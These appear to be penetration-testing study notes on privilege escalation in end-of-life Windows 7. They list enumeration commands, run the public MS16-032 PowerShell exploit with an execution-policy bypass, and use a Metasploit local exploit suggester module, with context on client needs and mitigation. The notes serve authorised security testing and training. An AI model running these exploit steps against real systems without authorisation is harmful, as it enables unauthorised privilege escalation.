### Windows 7 Enumeration
```bash
systeminfo
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database <database_file>.xls --systeminfo <systeminfo_file>.txt
```

### PowerShell (MS16-032)
```powershell
powershell.exe -ExecutionPolicy Bypass -Scope Process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

### Meterpreter (Local Exploit Suggester)
```bash
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
exploit
```


## **Key Points:**

- **EOL Status:**
    - Windows 7 reached its end-of-life on January 14, 2020.
- **Security Differences:**
    - Windows 7 lacks many security features present in Windows 10 (e.g., Microsoft Passport/MFA, Credential Guard, Device Guard, Control Flow Guard).
- **Prevalence:**
    - Despite being EOL, Windows 7 remains in use in numerous organizations.
    - It is important to understand why the client might still have these systems.
- **Penetration Testing Considerations:**
    - Context is crucial; understand the client's business needs and limitations.
    - Provide mitigation strategies beyond simply recommending upgrades.
- **Enumeration and Exploitation:**
    - Tools like Windows-Exploit-Suggester can identify potential privilege escalation vulnerabilities.
    - Installation of python2.7 and supporting libraries is required for windows-exploit-suggester on some systems.
    - `systeminfo` command output is used as input for Windows-Exploit-Suggester.
    - The example demonstrates exploiting MS16-032 (Secondary Logon Service vulnerability) using a PowerShell PoC.
- **Key tools and commands:**
    - `systeminfo`
    - Windows-Exploit-Suggester
    - PowerShell (Invoke-MS16-032.ps1)
    - Meterpreter (local exploit suggester)

**In essence:**

- Windows 7 poses significant security risks due to its EOL status and lack of modern security features.
- Penetration testers must be prepared to encounter and assess these systems.
- Understanding the client's context and providing practical mitigation strategies are essential.
- Windows 7 has many available exploits.
